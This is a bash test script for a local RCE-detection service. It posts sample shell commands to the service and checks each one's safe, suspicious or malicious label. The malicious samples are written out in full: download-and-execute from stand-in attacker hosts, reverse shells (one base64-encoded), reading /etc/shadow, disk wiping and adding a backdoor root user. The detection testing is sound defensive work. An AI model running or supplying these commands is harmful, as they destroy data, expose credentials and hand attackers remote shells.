#!/bin/bash
# Test suite for RCE detection patterns

echo "🧪 Testing RCE Detection Patterns"
echo "=================================="
echo ""

API_URL="http://localhost:8000/analyze"

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

test_count=0
passed_count=0

# Function to run a test
run_test() {
    local cmd="$1"
    local expected_class="$2"
    local description="$3"
    
    test_count=$((test_count + 1))
    
    response=$(curl -s -X POST "$API_URL" \
        -H "Content-Type: application/json" \
        -d "{\"command\":\"$cmd\"}")
    
    classification=$(echo "$response" | python3 -c "import sys, json; print(json.load(sys.stdin).get('classification', 'error'))" 2>/dev/null)
    
    if [ "$classification" = "$expected_class" ]; then
        echo -e "${GREEN}✓${NC} Test $test_count: $description"
        echo "  Command: $cmd"
        echo "  Expected: $expected_class, Got: $classification"
        passed_count=$((passed_count + 1))
    else
        echo -e "${RED}✗${NC} Test $test_count: $description"
        echo "  Command: $cmd"
        echo -e "  Expected: ${YELLOW}$expected_class${NC}, Got: ${RED}$classification${NC}"
    fi
    echo ""
}

# SAFE COMMANDS
echo "Testing SAFE commands..."
run_test "ls" "safe" "Simple directory listing"
run_test "ls -la /tmp" "safe" "Directory listing with args"
run_test "echo hello" "safe" "Echo command"
run_test "cat /etc/hostname" "safe" "Read system file"
run_test "whoami" "safe" "Get current user"
run_test "pwd" "safe" "Print working directory"
run_test "date" "safe" "Print date"
run_test "uptime" "safe" "System uptime"

# SUSPICIOUS COMMANDS
echo ""
echo "Testing SUSPICIOUS commands..."
run_test "eval \$(cat /tmp/script.sh)" "suspicious" "Eval with command substitution"
run_test "bash -c 'ls -la'" "suspicious" "Bash with -c flag"
run_test "sh -c 'whoami'" "suspicious" "Shell with -c flag"

# MALICIOUS COMMANDS
echo ""
echo "Testing MALICIOUS commands..."
run_test "curl http://attacker.com/script.sh | bash" "malicious" "Download and execute"
run_test "wget http://evil.com/malware.bin && chmod +x malware.bin && ./malware.bin" "malicious" "Download, chmod, execute"
run_test "bash -i >& /dev/tcp/attacker.com/4444 0>&1" "malicious" "Reverse shell via TCP"
run_test "nc -l -p 4444 -e /bin/bash" "malicious" "Netcat reverse shell"
run_test "python3 -c \"import os;os.system('cat /etc/shadow')\"" "malicious" "Python code execution"
run_test "rm -rf / --no-preserve-root" "malicious" "Destructive command"
run_test "mkfs.ext4 /dev/sda1" "malicious" "Format disk"
run_test "cat /etc/shadow > /tmp/shadow.txt" "malicious" "Exfiltrate shadow file"
run_test "echo 'root:$1$salt$hashed:0:0:root:/root:/bin/bash' >> /etc/passwd" "malicious" "Add backdoor user"
run_test "base64 -d <<< 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQgMD4mMQ=='" "malicious" "Decode base64 payload"

# Summary
echo ""
echo "=================================="
echo -e "Test Results: ${GREEN}$passed_count${NC}/${test_count} passed"

if [ $passed_count -eq $test_count ]; then
    echo -e "${GREEN}✅ All tests passed!${NC}"
    exit 0
else
    echo -e "${RED}❌ Some tests failed${NC}"
    exit 1
fi
